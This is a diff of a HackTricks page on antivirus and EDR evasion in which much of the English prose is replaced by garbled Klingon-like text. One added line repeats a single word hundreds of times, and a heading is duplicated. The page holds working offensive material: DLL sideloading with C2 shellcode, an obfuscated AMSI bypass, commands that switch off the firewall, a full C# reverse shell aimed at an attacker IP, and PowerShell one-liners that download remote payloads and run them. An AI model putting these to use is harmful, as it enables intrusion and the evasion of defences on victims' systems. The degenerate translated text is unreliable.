@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -77,7 +77,6 @@ As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/
 <figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
 
 Now we'll show some tricks you can use with DLL files to be much more stealthier.
-
 ## DLL Sideloading & Proxying
 
 **DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.
@@ -87,25 +86,13 @@ You can check for programs susceptible to DLL Sideloading using [Siofra](https:/
 {% code overflow="wrap" %}
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
-    $binarytoCheck = "C:\Program Files\" + $_
-    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
+$binarytoCheck = "C:\Program Files\" + $_
+C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
 {% endcode %}
 
-This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.
-
-I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.
-
-Just by placing a malicious DLL with the name a program expects to load, won't load your payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique called **DLL Proxying/Forwarding**.
-
-**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.
-
-I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)
-
-These are the steps I followed:
-
-{% code overflow="wrap" %}
+vaj vItlhutlh "C:\Program Files\\" je 'ej 'oH vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vIt
 ```
 1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
 2. Generate some shellcode (I used Havoc C2)
@@ -124,31 +111,27 @@ The last command will give us 2 files: a DLL source code template, and the origi
 ```
 {% endcode %}
 
-These are the results:
+ngoDvam:
 
 <figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.
+ngoDvamDaq shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) 'ej proxy DLL Hoch 'ej 0/26 Detection rate [antiscan.me](https://antiscan.me) Daq! jImej.
 
 <figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG\_WNpE) to learn more about what we've discussed more in-depth.
+jImej [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) DLL Sideloading 'ej [ippsec's video](https://www.youtube.com/watch?v=3eROsG\_WNpE) jImej 'ej DaH jImej.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
-
-You can use Freeze to load and execute your shellcode in a stealthy manner.
-
+`Freeze Hoch EDRs using suspended processes, direct syscalls, 'ej alternative execution methods bypassing payload toolkit`
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
 2. ./Freeze -I demon.bin -encrypt -O demon.exe
 3. Profit, no alerts from defender
 ```
-
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
@@ -199,26 +182,22 @@ Forcing the AMSI initialization to fail (amsiInitFailed) will result that no sca
 ```
 {% endcode %}
 
-All it took was one line of powershell code to render AMSI unusable for the current powershell process. This line has of course been flagged by AMSI itself, so some modification is needed in order to use this technique.
+ghItlh 'oH powershell code line vItlhutlh AMSI unusable for powershell process. AMSI 'e' vItlhutlh, so modification needed 'e' vItlhutlh technique vIlo'laH.
 
-Here is a modified AMSI bypass I took from this [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
-
+[GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) vItlhutlh modified AMSI bypass.
 ```powershell
 Try{#Ams1 bypass technic nº 2
-      $Xdatabase = 'Utils';$Homedrive = 'si'
-      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
-      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
-      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
-      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
-      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
-      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
-      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
-      $Spotfix.SetValue($null,$true)
-   }Catch{Throw $_}
+$Xdatabase = 'Utils';$Homedrive = 'si'
+$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
+$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
+$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
+$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
+$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
+$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
+$Spotfix.SetValue($null,$true)
+}Catch{Throw $_}
 ```
-
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
-
 **Memory Patching**
 
 This technique was initially discovered by [@RastaMouse](https://twitter.com/\_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E\_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
@@ -270,33 +249,27 @@ A very effective way to prevent your payloads from getting the Mark of The Web i
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.
 
 Example usage:
-
 ```powershell
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
-    +             o     +           +             o     +         +
-    o  +           +        +           o  +           +          o
++             o     +           +             o     +         +
+o  +           +        +           o  +           +          o
 -_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
-   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
-   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
+:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
+for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
 +      o         o   +       o       +      o         o   +       o
 +      o            +      o    ~   Mariusz Banach / mgeeky    o
 o      ~     +           ~          <mb [at] binary-offensive.com>
-    o           +                         o           +           +
+o           +                         o           +           +
 
 [.] Packaging input file to output .iso (iso)...
 Burning file onto ISO:
-    Adding file: /TotallyLegitApp.exe
+Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-
-Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
-
-<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
-
 ## C# Assembly Reflection
 
 Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.
@@ -309,13 +282,9 @@ Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) alr
 
 It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.
 
-<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
-
 * **Inline**
 
 It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.
-
-<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
@@ -355,24 +324,18 @@ Another tool doing the **same thing is** [**avred**](https://github.com/dobin/av
 ### **Telnet Server**
 
 Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
-
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-
-Make it **start** when the system is started and **run** it now:
-
+**Qa'vam** vItlhutlh **qaStaHvIS** je **chel** 'e' vItlhutlh:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-
-**Change telnet port** (stealth) and disable firewall:
-
+**Qapla' telnet port** (stealth) 'ej Qapla' firewall:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
-
 ### UltraVNC
 
 Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
@@ -398,7 +361,6 @@ The **attacker** should **execute inside** his **host** the binary `vncviewer.ex
 ### GreatSCT
 
 Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
-
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -406,9 +368,24 @@ cd GreatSCT/setup/
 cd ..
 ./GreatSCT.py
 ```
-
 Inside GreatSCT:
+----------------
 
+GreatSCT is a tool designed to generate payloads that can bypass antivirus (AV) detection. It achieves this by using various techniques to obfuscate the payload and make it undetectable by AV software.
+
+The tool provides a user-friendly interface that allows you to easily generate payloads with different obfuscation techniques. It supports both Windows and Linux platforms.
+
+To use GreatSCT, you first need to install it on your machine. You can do this by cloning the GitHub repository and running the setup script. Once installed, you can launch GreatSCT by running the `greatsct` command.
+
+Once inside GreatSCT, you have several options to choose from. You can select the payload type, the obfuscation technique, and the output format. GreatSCT supports a wide range of payload types, including reverse shells, bind shells, and meterpreter shells.
+
+When selecting the obfuscation technique, you can choose from options such as encoding, encryption, and shellcode injection. These techniques help to hide the payload from AV software and increase the chances of successful execution.
+
+After selecting the desired options, you can generate the payload by running the `generate` command. GreatSCT will then create the payload and save it to a specified output file.
+
+It's important to note that while GreatSCT can help bypass AV detection, it's not foolproof. AV software is constantly evolving, and new detection techniques are being developed. Therefore, it's always a good idea to test the generated payload against different AV software to ensure its effectiveness.
+
+In conclusion, GreatSCT is a powerful tool for generating payloads that can bypass AV detection. It provides a user-friendly interface and supports various obfuscation techniques. However, it's important to stay updated with the latest AV detection techniques to ensure the effectiveness of the generated payloads.
 ```
 use 1
 list #Listing available payloads
@@ -418,29 +395,23 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-
-Now **start the lister** with `msfconsole -r file.rc` and **execute** the **xml payload** with:
-
+**Qapla'** **lister** **bI'** `msfconsole -r file.rc` **'ej** **jatlh** **xml payload** **vaj**:**
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
+**Qa'leS defender vItlhutlh.**
 
-**Current defender will terminate the process very fast.**
-
-### Compiling our own reverse shell
+### ghItlhvam chaw'be' reverse shell
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### First C# Revershell
+#### C# Revershell cha'logh
 
-Compile it with:
-
+ghItlhvam vItlhutlh:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-
-Use it with:
-
+ghItlh'a' 'e' yIlo'!
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -459,78 +430,79 @@ using System.Net.Sockets;
 
 namespace ConnectBack
 {
-	public class Program
-	{
-		static StreamWriter streamWriter;
+public class Program
+{
+static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+public static void Main(string[] args)
+{
+using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+{
+using(Stream stream = client.GetStream())
+{
+using(StreamReader rdr = new StreamReader(stream))
+{
+streamWriter = new StreamWriter(stream);
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+StringBuilder strInput = new StringBuilder();
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.CreateNoWindow = true;
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.StartInfo.RedirectStandardInput = true;
+p.StartInfo.RedirectStandardError = true;
+p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+p.Start();
+p.BeginOutputReadLine();
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder strOutput = new StringBuilder();
+while(true)
+{
+strInput.Append(rdr.ReadLine());
+//strInput.Append("\n");
+p.StandardInput.WriteLine(strInput);
+strInput.Remove(0, strInput.Length);
+}
+}
+}
+}
+}
 
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
-            }
-        }
+private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+{
+StringBuilder strOutput = new StringBuilder();
 
-	}
+if (!String.IsNullOrEmpty(outLine.Data))
+{
+try
+{
+strOutput.Append(outLine.Data);
+streamWriter.WriteLine(strOutput);
+streamWriter.Flush();
+}
+catch (Exception err) { }
+}
+}
+
+}
 }
 ```
+### C# using compiler
 
+#### tlhIngan Hol
 
 ### C# using compiler
 
+#### tlhIngan Hol
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-
 [REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
 
 [REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
 
 Automatic download and execution:
-
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -538,18 +510,24 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 32bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
-
 {% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
 C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
-
 ```
 sudo apt-get install mingw-w64
 
 i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
+* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
+* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
